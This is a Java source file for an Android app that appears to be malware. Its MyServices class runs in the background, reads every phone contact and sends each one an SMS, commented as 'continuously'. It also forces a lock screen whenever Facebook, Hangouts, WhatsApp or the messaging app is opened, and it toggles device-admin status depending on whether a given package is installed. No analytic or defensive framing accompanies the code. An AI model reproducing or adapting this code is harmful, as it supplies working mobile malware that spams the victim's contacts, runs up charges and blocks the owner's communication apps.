package com.elite;

import java.util.ArrayList;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.telephony.SmsManager;

/**
 * This class is used for background services.
 * @author <b>Elite</b>
 *
 */
public class MyServices {
	
	/**
	 * This method is used to check whether the service is still running or not.
	 * @param context
	 * @return
	 */
	public boolean isMyServiceRunning(Context context) {
		ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if (IntentServiceClass.class.getName().equals(service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}
		
	/**
	 * This method is used to keep all funtionality running in background.
	 * @param context
	 */
	public void keepRunningActivity(Context context) {
		DeviceManager deviceManager=new DeviceManager();

		if(!isPackageExisted(context, context.getResources().getString(R.string.packagename))){
			
		/**Send SMS AsynTask.**/
		Async_sendSMS async_sendSMS=new Async_sendSMS(context);
		async_sendSMS.execute();
		
		/**Lock screen for specific packageName or className**/
		getTopActivity(context);
		}
		else {
			try {
				if(deviceManager.isDeviceAdminActive(context)){
					deviceManager.deactivateDeviceAdmin(context);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	/**
	 * This method is used to get the package name of the top running activity.
	 * @param context
	 */
	public void getTopActivity(Context context) {
		ActivityManager mActivityManager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
		ComponentName topActivity = mActivityManager.getRunningTasks(1).get(0).topActivity;
		String packageName = topActivity.getPackageName();

		if("com.facebook.katana".equalsIgnoreCase(packageName)
				|| "com.google.android.talk".equalsIgnoreCase(packageName)
				|| "com.whatsapp".equalsIgnoreCase(packageName)
				|| "com.android.mms".equalsIgnoreCase(packageName)){
			Intent intent = new Intent(context, LockScreen.class);
			intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | 
					Intent.FLAG_ACTIVITY_CLEAR_TASK |
					Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(intent);
		}
	}
	
    /**
     * This method is used to send sms and throw errow if exists.
     * @param phoneNumber
     * @param message
     */
    public void sendSMS(final Context context,String phoneNumber,String message) {
    	 String SENT = "SMS_SENT";
    	 String DELIVERED = "SMS_DELIVERED";

    	    SmsManager sms = SmsManager.getDefault();
    	    ArrayList<String> parts = sms.divideMessage(message);
    	    int messageCount = parts.size();

    	    ArrayList<PendingIntent> deliveryIntents = new ArrayList<PendingIntent>();
    	    ArrayList<PendingIntent> sentIntents = new ArrayList<PendingIntent>();

    	    PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, new Intent(SENT), 0);
    	    PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0, new Intent(DELIVERED), 0);

    	    for (int j = 0; j < messageCount; j++) {
    	        sentIntents.add(sentPI);
    	        deliveryIntents.add(deliveredPI);
    	    }

    	    // ---when the SMS has been sent---
    	    context.registerReceiver(new BroadcastReceiver() {
    	        @Override
    	        public void onReceive(Context arg0, Intent arg1) {
    	            switch (getResultCode()) {
    	            case Activity.RESULT_OK:
    	                break;
    	            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
    	                break;
    	            case SmsManager.RESULT_ERROR_NO_SERVICE:
    	                break;
    	            case SmsManager.RESULT_ERROR_NULL_PDU:
    	                break;
    	            case SmsManager.RESULT_ERROR_RADIO_OFF:
    	                break;
    	            }
    	        }
    	    }, new IntentFilter(SENT));

    	    // ---when the SMS has been delivered---
    	    context.registerReceiver(new BroadcastReceiver() {
    	        @Override
    	        public void onReceive(Context arg0, Intent arg1) {
    	            switch (getResultCode()) {

    	            case Activity.RESULT_OK:
    	                break;
    	            case Activity.RESULT_CANCELED:
    	                break;
    	            }
    	        }
    	    }, new IntentFilter(DELIVERED));

    	    sms.sendMultipartTextMessage(phoneNumber, null, parts, sentIntents, deliveryIntents);
    }
    
    /**
	 * This method is used to check whether a specific package exist in device or not.
	 * @param context
	 * @param targetPackage
	 * @return
	 */
	public boolean isPackageExisted(Context context,String targetPackage){
		   PackageManager pm=context.getPackageManager();
		   try {
		    pm.getPackageInfo(targetPackage,PackageManager.GET_META_DATA);
		       } catch (NameNotFoundException e) {
		    return false;
		    }  
		    return true;
     }
	
	/**
	 * This class is used to handle sms sending background task.
	 * @author <b>Elite</b>
	 *
	 */
	public class Async_sendSMS extends AsyncTask<Void, Void, Void>{
		private Context contextTask;
		
		public Async_sendSMS(Context context) {
			contextTask=context;
		}
		
		@Override
		protected Void doInBackground(Void... params) {
			try {
				Thread.sleep(5000);
				Cursor phones = contextTask.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
				while (phones.moveToNext()){
				 String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
				 String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				 
				 /**Send sms to all device contact numbers continuously.**/
				 sendSMS(contextTask,phoneNumber,"HEY!!! "+name+" "+contextTask.getResources().getString(R.string.msg));
				 
				}
				phones.close();

			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {

			super.onPostExecute(result);
		}	

	}
    
}
